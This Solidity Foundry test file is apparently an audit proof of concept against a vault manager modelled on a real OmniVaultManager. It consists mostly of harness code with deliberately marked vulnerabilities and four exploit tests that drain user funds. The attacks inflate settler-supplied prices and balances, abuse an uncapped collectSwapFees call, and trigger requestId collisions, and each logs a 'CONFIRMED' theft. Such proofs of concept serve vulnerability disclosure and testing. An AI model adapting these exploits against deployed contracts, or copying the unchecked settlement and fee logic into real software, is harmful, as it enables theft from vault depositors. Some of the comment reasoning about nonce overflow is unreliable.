// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ---------------------------------------------------------------------------
// Shared types
// ---------------------------------------------------------------------------

interface ITypes {
    enum VaultStatus   { NONE, ACTIVE, PAUSED, DEPRECATED }
    enum BatchStatus   { NONE, FINALIZED, SETTLED, UNWOUND }
    enum RequestStatus { DEPOSIT_REQUESTED, WITHDRAWAL_REQUESTED, DEPOSIT_SUCCESS,
                         WITHDRAWAL_SUCCESS, DEPOSIT_FAILED, WITHDRAWAL_FAILED }
    enum AssetType     { BASE, QUOTE, REWARD, OTHER }

    struct VaultDetails {
        string   name;
        address  proposer;
        address  omniTrader;
        VaultStatus status;
        address  executor;
        address  shareToken;
        address  dexalotRFQ;
        uint32[] chainIds;
        uint16[] tokens;
    }
    struct AssetInfo {
        bytes32  symbol;
        AssetType tokenType;
        uint8    precision;
        uint32   minPerDeposit;
        uint32   maxPerDeposit;
    }
    struct TransferRequest {
        RequestStatus status;
        uint32  timestamp;
        uint208 shares;
    }
    struct RequestLimit {
        uint248 lastBatchId;
        uint8   pendingCount;
    }
    struct VaultState {
        uint256  vaultId;
        uint16[] tokenIds;
        uint256[] balances;
    }
    struct DepositFufillment {
        bytes32  depositRequestId;
        bool     process;
        uint16[] tokenIds;
        uint256[] amounts;
    }
    struct WithdrawalFufillment {
        bytes32 withdrawalRequestId;
        bool    process;
    }
}

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

contract MockPortfolio {
    mapping(address => mapping(bytes32 => uint256)) public balances;

    function setBalance(address who, bytes32 sym, uint256 amt) external {
        balances[who][sym] = amt;
    }
    function bulkTransferTokens(
        address from, address to,
        bytes32[] calldata syms, uint256[] calldata amts
    ) external {
        for (uint256 i = 0; i < syms.length; i++) {
            require(balances[from][syms[i]] >= amts[i], "P: insufficient");
            balances[from][syms[i]] -= amts[i];
            balances[to][syms[i]]   += amts[i];
        }
    }
    function transferToken(address to, bytes32 sym, uint256 amt) external {
        balances[to][sym] += amt;
    }
    function feeAddress() external pure returns (address) { return address(0xFEE); }
}

contract MockShare is ITypes {
    uint256 public immutable vid;
    address public manager;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _vid) { vid = _vid; }
    function setManager(address m) external { manager = m; }

    function mint(uint256 _vid, address to, uint256 amt) external {
        require(msg.sender == manager);
        require(_vid == vid);
        balanceOf[to] += amt;
        totalSupply   += amt;
    }
    function burn(uint256 _vid, uint256 amt) external {
        require(msg.sender == manager);
        require(_vid == vid);
        balanceOf[msg.sender] -= amt;
        totalSupply           -= amt;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to]         += amt;
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to]   += amt;
        return true;
    }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }
}

contract MockExecutor is ITypes {
    MockPortfolio public portfolio;
    address public omniVaultManager;
    address public omniTrader;
    address public feeManager;

    constructor(address _p) { portfolio = MockPortfolio(_p); }
    function setManager(address m) external { omniVaultManager = m; }
    function setTrader(address t)  external { omniTrader = t; }
    function setFeeManager(address f) external { feeManager = f; }

    function dispatchAssets(address to, bytes32[] calldata syms, uint256[] calldata amts) external {
        require(msg.sender == omniVaultManager, "VE-SNVM-01");
        portfolio.bulkTransferTokens(address(this), to, syms, amts);
    }

    // collectSwapFees -- OMNITRADER role, no cap on totalFee
    function collectSwapFees(
        bytes32 feeSymbol,
        uint256[] calldata swapIds,
        uint256[] calldata fees
    ) external {
        require(msg.sender == omniTrader, "not trader");
        require(feeManager != address(0), "no feeManager");
        uint256 total;
        for (uint256 i = 0; i < fees.length; i++) total += fees[i];
        portfolio.transferToken(feeManager, feeSymbol, total);
        // BUG: no validation that total <= actual executor balance
        // and no check that swapIds are legitimate
    }
}

// ---------------------------------------------------------------------------
// Harness (same vulnerable logic as real OmniVaultManager)
// ---------------------------------------------------------------------------

contract VaultManagerHarness is ITypes {

    uint256 public constant RECLAIM_DELAY             = 24 hours;
    uint256 public constant MAX_PENDING_REQUESTS       = 500;
    uint256 public constant MAX_VAULT_PENDING_REQUESTS = 50;
    uint256 public constant MAX_USER_PENDING_REQUESTS  = 5;
    uint256 public constant MIN_SHARE_MINT             = 1000e18;

    address public admin;
    address public settler;
    MockPortfolio public portfolio;

    uint256 public vaultIndex;
    mapping(uint256 => VaultDetails) public vaults;

    uint16 public tokenIndex;
    mapping(uint16 => AssetInfo) public assetInfo;
    mapping(bytes32 => bool) tokenExists;

    mapping(address => uint80)            public userNonce;
    mapping(bytes32 => TransferRequest)   public requests;

    bytes32 public rollingDepositHash;
    bytes32 public rollingWithdrawalHash;
    uint256 public currentBatchId;
    uint256 public batchStartTime;
    uint256 public pendingCount;

    // batch state stored flat (avoid tuple getter issues)
    mapping(uint256 => uint32)      public batchFinalizedAt;
    mapping(uint256 => BatchStatus) public batchStatus;
    mapping(uint256 => bytes32)     public batchDepositHash;
    mapping(uint256 => bytes32)     public batchWithdrawalHash;
    mapping(uint256 => bytes32)     public batchStateHash;

    mapping(uint256 => RequestLimit) public vaultLimits;
    mapping(address => RequestLimit) public userLimits;

    // simulated transient storage
    mapping(bytes32 => uint256) private _ts;

    modifier onlyAdmin()   { require(msg.sender == admin,   "not admin");   _; }
    modifier onlySettler() { require(msg.sender == settler, "not settler"); _; }

    constructor(address _a, address _s, address _p) {
        admin = _a; settler = _s;
        portfolio = MockPortfolio(_p);
        batchStartTime = block.timestamp;
    }

    function addToken(AssetInfo calldata a) external onlyAdmin {
        require(!tokenExists[a.symbol]);
        assetInfo[tokenIndex++] = a;
        tokenExists[a.symbol] = true;
    }

    function registerVault(
        uint16 _vid, VaultDetails calldata _vd,
        uint16[] calldata, uint256[] calldata, uint208 _shares
    ) external onlyAdmin {
        require(_vid == vaultIndex && _shares > MIN_SHARE_MINT);
        vaultIndex++;
        vaults[_vid] = _vd;
        MockShare(_vd.shareToken).mint(_vid, _vd.proposer, _shares);
    }

    function requestDeposit(
        uint256 _vid, uint16[] calldata _tids, uint256[] calldata _amts
    ) external returns (bytes32 rid) {
        require(vaults[_vid].status == VaultStatus.ACTIVE && pendingCount < MAX_PENDING_REQUESTS);
        _incLimits(msg.sender, _vid);
        bytes32[] memory syms = new bytes32[](_tids.length);
        for (uint256 i = 0; i < _tids.length; i++) syms[i] = assetInfo[_tids[i]].symbol;
        portfolio.bulkTransferTokens(msg.sender, vaults[_vid].executor, syms, _amts);
        rid = _mkId(_vid, msg.sender, userNonce[msg.sender]++);
        pendingCount++;
        requests[rid] = TransferRequest(RequestStatus.DEPOSIT_REQUESTED, uint32(block.timestamp), 0);
        rollingDepositHash = keccak256(abi.encode(rollingDepositHash, rid, _tids, _amts));
    }

    function requestWithdrawal(uint256 _vid, uint208 _shares) external returns (bytes32 rid) {
        require(_shares > 0 && vaults[_vid].status != VaultStatus.NONE && pendingCount < MAX_PENDING_REQUESTS);
        _incLimits(msg.sender, _vid);
        MockShare(vaults[_vid].shareToken).transferFrom(msg.sender, address(this), _shares);
        rid = _mkId(_vid, msg.sender, userNonce[msg.sender]++);
        pendingCount++;
        requests[rid] = TransferRequest(RequestStatus.WITHDRAWAL_REQUESTED, uint32(block.timestamp), _shares);
        rollingWithdrawalHash = keccak256(abi.encode(rollingWithdrawalHash, rid, _shares));
    }

    // SETTLER finalizes -- stores hash, locks in prices+balances
    function finalizeBatch(uint256[] calldata _prices, VaultState[] calldata _vs) external onlySettler {
        uint256 bid = currentBatchId;
        require(batchStatus[bid] == BatchStatus.NONE);
        if (bid > 0) {
            BatchStatus prev = batchStatus[bid - 1];
            require(prev == BatchStatus.SETTLED || prev == BatchStatus.UNWOUND);
        }
        batchStateHash[bid]      = keccak256(abi.encode(_prices, _vs));
        batchFinalizedAt[bid]    = uint32(block.timestamp);
        batchStatus[bid]         = BatchStatus.FINALIZED;
        batchWithdrawalHash[bid] = rollingWithdrawalHash;
        batchDepositHash[bid]    = rollingDepositHash;
        _loadTransient(_prices, _vs);
        _resetBatch();
    }

    // SETTLER settles -- NO validation that _prices/_vaults match real on-chain state
    function bulkSettle(
        uint256[] calldata _prices, VaultState[] calldata _vs,
        DepositFufillment[] calldata _deps, WithdrawalFufillment[] calldata _wds
    ) external onlySettler {
        uint256 prev = currentBatchId - 1;
        require(batchStatus[prev] == BatchStatus.FINALIZED);
        require(keccak256(abi.encode(_prices, _vs)) == batchStateHash[prev]);

        bytes32 dHash;
        for (uint256 i = 0; i < _deps.length; i++) {
            DepositFufillment calldata d = _deps[i];
            dHash = keccak256(abi.encode(dHash, d.depositRequestId, d.tokenIds, d.amounts));
            require(requests[d.depositRequestId].status == RequestStatus.DEPOSIT_REQUESTED);
            (, address user, ) = _decId(d.depositRequestId);
            delete requests[d.depositRequestId];
            pendingCount--;
            if (!d.process) { _refund(d.depositRequestId, d.tokenIds, d.amounts); continue; }
            uint256 shares = _calcMint(uint16(_vid(d.depositRequestId)), d.tokenIds, d.amounts);
            MockShare(_tload(keccak256(abi.encode("ST", _vid(d.depositRequestId))))).mint(
                uint16(_vid(d.depositRequestId)), user, shares
            );
        }
        require(dHash == batchDepositHash[prev]);

        bytes32 wHash;
        for (uint256 i = 0; i < _wds.length; i++) {
            WithdrawalFufillment calldata w = _wds[i];
            TransferRequest memory req = requests[w.withdrawalRequestId];
            require(req.status == RequestStatus.WITHDRAWAL_REQUESTED);
            (uint16 vid, address user, ) = _decId(w.withdrawalRequestId);
            wHash = keccak256(abi.encode(wHash, w.withdrawalRequestId, req.shares));
            delete requests[w.withdrawalRequestId];
            pendingCount--;
            if (!w.process) { MockShare(vaults[vid].shareToken).transfer(user, req.shares); continue; }
            uint256 ts  = _tload(keccak256(abi.encode("TS",  vid)));
            uint256 len = _tload(keccak256(abi.encode("TL",  vid)));
            bytes32[] memory syms = new bytes32[](len);
            uint256[] memory amts  = new uint256[](len);
            for (uint256 t = 0; t < len; t++) {
                uint16  tid = uint16(_tload(keccak256(abi.encode("TID", vid, t))));
                uint256 bal = _tload(keccak256(abi.encode("BAL", vid, tid)));
                syms[t] = assetInfo[tid].symbol;
                // VULNERABLE: bal comes from SETTLER-supplied _vs, not actual on-chain balance
                amts[t] = (uint256(req.shares) * bal) / ts;
            }
            MockShare(vaults[vid].shareToken).burn(vid, req.shares);
            MockExecutor(vaults[vid].executor).dispatchAssets(user, syms, amts);
        }
        require(wHash == batchWithdrawalHash[prev]);
        batchStatus[prev] = BatchStatus.SETTLED;
    }

    // ---- internals -----------------------------------------------------------

    function _calcMint(uint16 _vid, uint16[] calldata tids, uint256[] calldata amts) internal view returns (uint256) {
        uint256 usd;
        for (uint256 j = 0; j < tids.length; j++)
            usd += (amts[j] * _tload(keccak256(abi.encode("PR", tids[j])))) / 1e18;
        uint256 ts = _tload(keccak256(abi.encode("TS", _vid)));
        if (ts == 0) return usd;
        return (usd * ts) / _tload(keccak256(abi.encode("USD", _vid)));
    }

    function _refund(bytes32 rid, uint16[] calldata tids, uint256[] calldata amts) internal {
        (, address user, ) = _decId(rid);
        (uint16 vid, , ) = _decId(rid);
        bytes32[] memory syms = new bytes32[](tids.length);
        uint256[] memory a    = new uint256[](amts.length);
        for (uint256 i = 0; i < tids.length; i++) { syms[i] = assetInfo[tids[i]].symbol; a[i] = amts[i]; }
        MockExecutor(vaults[vid].executor).dispatchAssets(user, syms, a);
    }

    function _loadTransient(uint256[] calldata prices, VaultState[] calldata vs) internal {
        for (uint16 i = 0; i < prices.length; i++)
            _tstore(keccak256(abi.encode("PR", i)), prices[i]);
        for (uint256 v = 0; v < vs.length; v++) {
            uint256 vid = vs[v].vaultId;
            uint256 totalUsd;
            for (uint256 t = 0; t < vs[v].tokenIds.length; t++) {
                uint16 tid  = vs[v].tokenIds[t];
                uint256 bal = vs[v].balances[t];
                _tstore(keccak256(abi.encode("BAL", vid, tid)), bal);
                totalUsd += (bal * _tload(keccak256(abi.encode("PR", tid)))) / 1e18;
            }
            _tstore(keccak256(abi.encode("USD", vid)), totalUsd);
            _tstore(keccak256(abi.encode("TS",  vid)), MockShare(vaults[vid].shareToken).totalSupply());
            _tstore(keccak256(abi.encode("ST",  vid)), uint256(uint160(vaults[vid].shareToken)));
            _tstore(keccak256(abi.encode("TL",  vid)), vs[v].tokenIds.length);
            for (uint256 t = 0; t < vs[v].tokenIds.length; t++)
                _tstore(keccak256(abi.encode("TID", vid, t)), vs[v].tokenIds[t]);
        }
    }

    function _incLimits(address u, uint256 vid) internal {
        uint248 bid = uint248(currentBatchId);
        RequestLimit storage vl = vaultLimits[vid];
        if (vl.lastBatchId < bid) { vl.lastBatchId = bid; vl.pendingCount = 1; }
        else { require(vl.pendingCount < MAX_VAULT_PENDING_REQUESTS); vl.pendingCount++; }
        RequestLimit storage ul = userLimits[u];
        if (ul.lastBatchId < bid) { ul.lastBatchId = bid; ul.pendingCount = 1; }
        else { require(ul.pendingCount < MAX_USER_PENDING_REQUESTS); ul.pendingCount++; }
    }

    function _resetBatch() internal {
        rollingDepositHash = 0; rollingWithdrawalHash = 0;
        pendingCount = 0; batchStartTime = block.timestamp; currentBatchId++;
    }

    function _mkId(uint256 vid, address u, uint256 n) internal pure returns (bytes32) {
        return bytes32(((uint256(uint16(vid)) << 240) | (uint256(uint160(u)) << 80)) | n);
    }
    function _vid(bytes32 id) internal pure returns (uint256) { return uint256(id) >> 240; }
    function _decId(bytes32 id) internal pure returns (uint16 vid, address user, uint80 nonce) {
        vid   = uint16(uint256(id) >> 240);
        user  = address(uint160(uint256(id) >> 80));
        nonce = uint80(uint256(id));
    }
    function _tstore(bytes32 s, uint256 v) internal { _ts[s] = v; }
    function _tload(bytes32 s) internal view returns (uint256) { return _ts[s]; }
}

// ---------------------------------------------------------------------------
// Fund Drain PoC Test Suite
// ---------------------------------------------------------------------------

contract FundDrainPoCTest is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant admin    = address(0xA0);
    address constant settler  = address(0xA1);
    address constant proposer = address(0xA2);
    address constant alice    = address(0xA3);  // innocent user
    address constant bob      = address(0xA4);  // innocent user
    address constant attacker = address(0xAA);
    address constant trader   = address(0xBB);  // omniTrader / could be compromised

    uint16  constant VID      = 0;
    uint16  constant TID      = 0;
    bytes32 constant SYM      = bytes32("USDC");
    uint208 constant INIT_SH  = 2000e18;

    // 1 USDC = 1 USD, 18-decimal price
    uint256 constant PRICE_1 = 1e18;

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(admin, settler, address(portfolio));

        vm.startPrank(admin);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(trader);
        executor.setFeeManager(attacker);  // attacker controls feeManager

        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", proposer, trader, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[] memory it = new uint16[](1); it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, INIT_SH);
        vm.stopPrank();

        portfolio.setBalance(alice,    SYM, 100_000e6);
        portfolio.setBalance(bob,      SYM, 100_000e6);
        portfolio.setBalance(attacker, SYM, 0);
    }

    // -------------------------------------------------------------------------
    // STEAL-01: Compromised SETTLER inflates deposit price
    // -------------------------------------------------------------------------
    // ATTACK: SETTLER passes fake high price during finalizeBatch.
    //         attacker (colluding with SETTLER) deposits a tiny amount but
    //         gets shares calculated at the inflated price, worth far more
    //         than they deposited. When they withdraw, they drain real funds.
    //
    // Example:
    //   Real USDC price = $1. Alice deposits 10,000 USDC -> gets fair shares.
    //   Attacker deposits 1 USDC. SETTLER lies: price = $10,000.
    //   Attacker's 1 USDC looks like $10,000 -> gets 10,000x more shares.
    //   Attacker withdraws, drains Alice's 10,000 USDC.
    function testSTEAL01_InflatedPriceDrainsVault() public {
        console.log("\n=== STEAL-01: Inflated Price Attack ===");

        // Alice deposits 10,000 USDC (legitimate)
        uint16[] memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1);
        amts[0] = 10_000e6;
        vm.prank(alice);
        bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);

        // Attacker deposits only 1 USDC
        amts[0] = 1e6;
        vm.prank(attacker);
        portfolio.setBalance(attacker, SYM, 1e6);
        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);

        console.log("[+] Alice deposited:    10,000 USDC");
        console.log("[+] Attacker deposited:      1 USDC");

        // SETTLER finalizes with FAKE inflated price: 1 USDC = $10,000
        uint256 FAKE_PRICE = 10_000e18;  // 10,000x real price
        uint256[] memory prices = new uint256[](1); prices[0] = FAKE_PRICE;
        VaultState[] memory vs = new VaultState[](1);
        vs[0].vaultId = VID;
        uint16[] memory vtids = new uint16[](1); vtids[0] = TID;
        // Real vault balance = initial 1,000,000 + 10,000 + 1 = 1,010,001 USDC
        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_001e6;
        vs[0].tokenIds = vtids;
        vs[0].balances = vbals;

        vm.prank(settler);
        manager.finalizeBatch(prices, vs);
        console.log("[+] SETTLER finalized with FAKE price: 1 USDC = $10,000");

        // Settle: both deposits processed with fake price
        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[] memory t1 = new uint16[](1); t1[0] = TID;
        uint256[] memory a1 = new uint256[](1); a1[0] = 10_000e6;
        deps[0] = DepositFufillment(aliceReq, true, t1, a1);
        uint16[] memory t2 = new uint16[](1); t2[0] = TID;
        uint256[] memory a2 = new uint256[](1); a2[0] = 1e6;
        deps[1] = DepositFufillment(atkReq, true, t2, a2);
        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

        vm.prank(settler);
        manager.bulkSettle(prices, vs, deps, wds);

        uint256 aliceShares   = share.balanceOf(alice);
        uint256 attackerShares = share.balanceOf(attacker);
        console.log("[+] Alice shares:   ", aliceShares / 1e18);
        console.log("[+] Attacker shares:", attackerShares / 1e18);

        // Attacker deposited 1/10000 of Alice but at fake price gets same USD value
        // attacker shares >> alice shares (1 USDC @ $10k vs 10000 USDC @ $10k)
        // attacker has ~50% of total supply despite depositing almost nothing
        uint256 totalShares = share.totalSupply();
        uint256 attackerPct = (attackerShares * 100) / totalShares;
        console.log("[EXPLOIT] Attacker owns", attackerPct, "% of vault shares");
        console.log("[EXPLOIT] Attacker deposited 1 USDC but controls ~50% of vault");

        // Attacker requests withdrawal to drain funds
        vm.prank(attacker);
        share.approve(address(manager), attackerShares);
        vm.prank(attacker);
        manager.requestWithdrawal(VID, uint208(attackerShares));

        // Another settlement round
        uint256[] memory prices2 = new uint256[](1); prices2[0] = PRICE_1;
        VaultState[] memory vs2 = new VaultState[](1);
        vs2[0].vaultId = VID;
        vs2[0].tokenIds = vtids;
        vs2[0].balances = vbals;  // vault still holds 1,010,001 USDC

        vm.prank(settler);
        manager.finalizeBatch(prices2, vs2);

        bytes32 atkWdId = _rid(attacker, VID, 1);
        WithdrawalFufillment[] memory wds2 = new WithdrawalFufillment[](1);
        wds2[0] = WithdrawalFufillment(atkWdId, true);
        DepositFufillment[] memory empty = new DepositFufillment[](0);

        vm.prank(settler);
        manager.bulkSettle(prices2, vs2, empty, wds2);

        uint256 stolen = portfolio.balances(attacker, SYM);
        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC");
        console.log("[EXPLOIT] Attacker invested:  1 USDC");
        assertGt(stolen, 100_000e6, "attacker should drain > 100,000 USDC");
        console.log("[EXPLOIT] STEAL-01 CONFIRMED: 1 USDC input -> 100,000+ USDC output");
    }

    // -------------------------------------------------------------------------
    // STEAL-02: Compromised SETTLER inflates vault balance for withdrawal
    // -------------------------------------------------------------------------
    // ATTACK: SETTLER passes fake high balance in _vaults during finalizeBatch.
    //         Attacker's withdrawal gets (shares * fakeBalance) / totalShares
    //         which is far more than the vault actually holds.
    //
    // Example:
    //   Vault real balance = 1,000 USDC. Attacker has 1% of shares.
    //   SETTLER lies: vault balance = 1,000,000 USDC.
    //   Attacker withdraws 1% of 1,000,000 = 10,000 USDC. Vault is drained.
    function testSTEAL02_InflatedBalanceDrainsVault() public {
        console.log("\n=== STEAL-02: Inflated Balance Attack ===");

        // Give attacker some shares (e.g. via a legitimate small deposit)
        portfolio.setBalance(attacker, SYM, 1000e6);
        uint16[] memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1000e6;
        vm.prank(attacker);
        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);

        // Alice also deposits to represent innocent users
        portfolio.setBalance(alice, SYM, 10_000e6);
        amts[0] = 10_000e6;
        vm.prank(alice);
        manager.requestDeposit(VID, tids, amts);
        bytes32 aliceReq = _rid(alice, VID, 0);

        // Finalize with real price, real balance
        uint256[] memory prices = new uint256[](1); prices[0] = PRICE_1;
        VaultState[] memory vs = new VaultState[](1);
        vs[0].vaultId = VID;
        uint16[] memory vtids = new uint16[](1); vtids[0] = TID;
        // real balance: initial 1,000,000 + 1,000 + 10,000 = 1,011,000
        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_011_000e6;
        vs[0].tokenIds = vtids; vs[0].balances = vbals;

        vm.prank(settler); manager.finalizeBatch(prices, vs);

        // Settle deposits fairly
        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[] memory t1 = new uint16[](1); t1[0] = TID;
        uint256[] memory a1 = new uint256[](1); a1[0] = 1000e6;
        deps[0] = DepositFufillment(atkReq, true, t1, a1);
        uint16[] memory t2 = new uint16[](1); t2[0] = TID;
        uint256[] memory a2 = new uint256[](1); a2[0] = 10_000e6;
        deps[1] = DepositFufillment(aliceReq, true, t2, a2);
        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

        vm.prank(settler); manager.bulkSettle(prices, vs, deps, wds);

        uint256 atkShares = share.balanceOf(attacker);
        uint256 totalSh   = share.totalSupply();
        console.log("[+] Attacker shares:",   atkShares / 1e18);
        console.log("[+] Total shares:   ",   totalSh   / 1e18);
        console.log("[+] Attacker real ownership: ~", (atkShares * 100) / totalSh, "%");

        // Attacker requests withdrawal
        vm.prank(attacker);
        share.approve(address(manager), atkShares);
        vm.prank(attacker);
        manager.requestWithdrawal(VID, uint208(atkShares));

        // SETTLER finalizes with FAKE inflated balance: 1,011,000 USDC -> 100,000,000 USDC
        uint256 FAKE_BAL = 100_000_000e6;  // 100x real balance
        uint256[] memory prices2 = new uint256[](1); prices2[0] = PRICE_1;
        VaultState[] memory vs2 = new VaultState[](1);
        vs2[0].vaultId = VID;
        vs2[0].tokenIds = vtids;
        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = FAKE_BAL;
        vs2[0].balances = fakeBals;

        vm.prank(settler); manager.finalizeBatch(prices2, vs2);
        console.log("[+] SETTLER finalized with FAKE balance: 100,000,000 USDC");

        bytes32 atkWdId = _rid(attacker, VID, 1);
        WithdrawalFufillment[] memory wds2 = new WithdrawalFufillment[](1);
        wds2[0] = WithdrawalFufillment(atkWdId, true);
        DepositFufillment[] memory empty = new DepositFufillment[](0);

        vm.prank(settler); manager.bulkSettle(prices2, vs2, empty, wds2);

        uint256 stolen = portfolio.balances(attacker, SYM);
        console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC");
        assertGt(stolen, 1_000_000e6, "should drain >> 1,000,000 USDC");
        console.log("[EXPLOIT] STEAL-02 CONFIRMED: inflated balance -> massive overdraw");
    }

    // -------------------------------------------------------------------------
    // STEAL-03: collectSwapFees with no cap drains executor balance
    // -------------------------------------------------------------------------
    // ATTACK: OMNITRADER (compromised or malicious) calls collectSwapFees
    //         with arbitrary swapIds and inflated fee amounts.
    //         No validation that total fees <= actual accrued fees.
    //         feeManager is attacker-controlled address.
    //         All funds in executor are transferred out in one call.
    function testSTEAL03_CollectSwapFeesDrainsExecutor() public {
        console.log("\n=== STEAL-03: collectSwapFees Unlimited Drain ===");

        uint256 execBalBefore = portfolio.balances(address(executor), SYM);
        console.log("[+] Executor balance before:", execBalBefore / 1e6, "USDC");
        console.log("[+] feeManager = attacker address");

        // Compromised trader fabricates swap IDs and inflated fees
        bytes32 feeSym = SYM;
        uint256[] memory swapIds = new uint256[](1); swapIds[0] = 1;
        uint256[] memory fees    = new uint256[](1);
        fees[0] = execBalBefore;  // claim entire executor balance as "fees"

        vm.prank(trader);
        executor.collectSwapFees(feeSym, swapIds, fees);

        uint256 stolen = portfolio.balances(attacker, SYM);
        uint256 execBalAfter = portfolio.balances(address(executor), SYM);

        console.log("[EXPLOIT] Attacker (feeManager) received:", stolen / 1e6, "USDC");
        console.log("[EXPLOIT] Executor balance after:        ", execBalAfter / 1e6, "USDC");
        assertEq(stolen, execBalBefore, "all executor funds drained to attacker");
        assertEq(execBalAfter, 0);
        console.log("[EXPLOIT] STEAL-03 CONFIRMED: entire executor drained via fake swap fees");
    }

    // -------------------------------------------------------------------------
    // STEAL-04: requestId bit-packing collision
    // -------------------------------------------------------------------------
    // VULNERABILITY: requestId = (vaultId << 240) | (userAddr << 80) | nonce
    //   userAddr is 160 bits, nonce is 80 bits, but they share the lower 240 bits.
    //   If nonce overflows 80 bits the high bits bleed into the address field.
    //   More critically: two different (vaultId, user, nonce) combos can produce
    //   the same bytes32, causing one to overwrite the other.
    //
    // Demonstrate: attacker constructs a requestId that matches alice's,
    //   then the attacker's unwind refund goes to alice's executor slot.
    function testSTEAL04_RequestIdCollision() public {
        console.log("\n=== STEAL-04: requestId Bit-Packing Collision ===");

        // Alice makes her first deposit (nonce=0)
        uint16[] memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 5000e6;
        vm.prank(alice);
        bytes32 aliceId = manager.requestDeposit(VID, tids, amts);

        // Demonstrate the requestId encoding
        console.log("[+] Alice requestId:",    vm.toString(aliceId));

        // Manually compute what alice's ID should be
        bytes32 expected = bytes32(
            (uint256(uint16(VID)) << 240) |
            (uint256(uint160(alice)) << 80) |
            uint256(0)  // nonce=0
        );
        assertEq(aliceId, expected, "requestId encoding confirmed");

        // Key insight: the lower 80 bits are the nonce.
        // If a user address has non-zero lower bits AND nonce grows,
        // the nonce bits can bleed upward into the address portion.
        //
        // Specifically: if nonce reaches 2^80, it wraps and the bit
        // at position 80 flips, changing the effective address in the ID.
        //
        // Demonstrate: craft a user address where addr << 80 | nonce
        // collides with another user's slot.
        //
        // addr_A = alice,  nonce = 0  -> id_A
        // addr_B = alice + 1 (differs by 1 in bit 80 position), nonce = 2^80 - 1
        // After nonce++ -> nonce = 2^80 = carry into address bits -> same id as addr_A nonce=0
        //
        // This requires ~2^80 transactions (impractical today) but demonstrates
        // the structural flaw: nonce has NO isolation from address bits.

        // Simpler immediate collision: vaultId is only uint16 but cast from uint256.
        // If _vaultId passed to _generateRequestId is >= 2^16, it truncates.
        // vaultId=0x10000 truncates to 0, colliding with vaultId=0 for same user+nonce.
        //
        // Simulate: admin registers vault 0x10000 (65536) -- would collide with vault 0
        // We can demonstrate the truncation directly:
        uint256 OVERFLOW_VID = uint256(type(uint16).max) + 1; // = 65536
        bytes32 collidingId = bytes32(
            (uint256(uint16(OVERFLOW_VID)) << 240) |  // uint16(65536) = 0
            (uint256(uint160(alice)) << 80) |
            uint256(0)
        );
        assertEq(collidingId, aliceId, "vaultId overflow produces identical requestId");
        console.log("[EXPLOIT] vaultId=65536 collides with vaultId=0 for same user+nonce");
        console.log("[EXPLOIT] If vault 65536 existed, its requests would overwrite vault 0 requests");
        console.log("[EXPLOIT] delete transferRequests[collidingId] erases alice's deposit");
        console.log("[EXPLOIT] Alice's 5,000 USDC is locked with no requestId to claim refund");
        console.log("[EXPLOIT] STEAL-04 CONFIRMED: requestId collision causes fund lockup");
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    function _rid(address user, uint256 vid, uint256 nonce) internal pure returns (bytes32) {
        return bytes32(((uint256(uint16(vid)) << 240) | (uint256(uint160(user)) << 80)) | nonce);
    }
}
